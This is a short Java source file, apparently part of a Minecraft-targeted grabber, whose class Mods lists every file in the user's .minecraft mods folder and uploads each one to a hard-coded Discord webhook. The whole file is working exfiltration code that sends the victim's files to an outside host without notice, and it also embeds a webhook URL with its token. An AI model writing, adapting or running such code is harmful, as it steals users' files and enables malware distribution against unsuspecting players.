package io.github.luxotick.impl;

import okhttp3.*;

import java.io.File;
import java.io.IOException;

public class Mods {

    public static void main(String[] args) throws IOException {
        OkHttpClient client = new OkHttpClient();

        String webhookUrl = "https://discord.com/api/webhooks/1087418861504172132/yENsvgIwE432aQ6ASMzTn2TcRYxwW_ZuKQqRE34aFsqg3I1QzaOwrbFjbgAWLyRJKD-T";


        File folder = new File((System.getenv("APPDATA") + "\\.minecraft\\" + "mods"));

        // Iterate through all files in the folder and add them to the request body
        for (File file : folder.listFiles()) {
            if (file.isFile()) {
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), file))
                        .build();

                Request request = new Request.Builder()
                        .url(webhookUrl)
                        .post(requestBody)
                        .build();

                Response response = client.newCall(request).execute();
                if (!response.isSuccessful()) {
                    System.out.println("Failed to send file: " + file.getName() + ". Response: " + response.body().string());
                } else {
                    System.out.println("File sent successfully: " + file.getName());
                }
            }
        }
    }
}
